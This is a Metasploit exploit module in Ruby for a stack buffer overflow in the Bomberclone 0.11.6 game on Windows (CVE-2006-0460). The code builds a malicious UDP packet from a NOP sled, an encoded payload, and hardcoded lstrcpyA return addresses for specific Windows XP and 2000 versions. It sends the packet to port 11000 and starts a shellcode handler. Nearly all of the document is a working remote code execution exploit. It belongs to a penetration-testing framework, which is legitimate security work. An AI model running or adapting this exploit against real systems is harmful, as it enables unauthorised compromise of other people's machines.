##
# $Id: bomberclone_overflow.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Bomberclone 0.11.6 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Bomberclone 0.11.6 for Windows.
				The return address is overwritten with lstrcpyA memory address,
				the second and third value are the destination buffer,
				the fourth value is the source address of our buffer in the stack.
				This exploit is like a return in libc.

				ATTENTION
				The shellcode is exec ONLY when someone try to close bomberclone.
			},
			'Author'         => 'Jacopo Cervini <acaro[at]jervus.it>',
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					['CVE', '2006-0460'],
					['OSVDB', '23263'],
					['BID', '16697'],
					['URL', 'http://www.frsirt.com/english/advisories/2006/0643' ],
				],
			'Payload'        =>
				{
					'Space'    => 344,
					'BadChars' => "\x00"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows XP SP2 Italian',   { 'Ret' => 0x7c80c729, } ], # kernel32!lstrcpyA
					['Windows 2000 SP1 English', { 'Ret' => 0x77e85f08, } ], # kernel32!lstrcpyA
					['Windows 2000 SP1 English', { 'Ret' => 0x77e95e8b, } ], # kernel32!lstrcpyA
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 16 2006'
			))

		register_options([ Opt::RPORT(11000) ], self.class)
	end

	def exploit
		connect_udp

		pattern  = make_nops(421)
		pattern << payload.encoded
		pattern << [ target.ret ].pack('V')
		pattern << "\x04\xec\xfd\x7f" * 2
		pattern << "\xa4\xfa\x22\x00"

		request  = "\x00\x00\x00\x00\x38\x03\x41" + pattern + "\r\n"

		print_status("Trying #{target.name} using lstrcpyA address at #{"0x%.8x" % target.ret }...")

		udp_sock.put(request)
		udp_sock.get

		handler(udp_sock)
		disconnect_udp
	end

end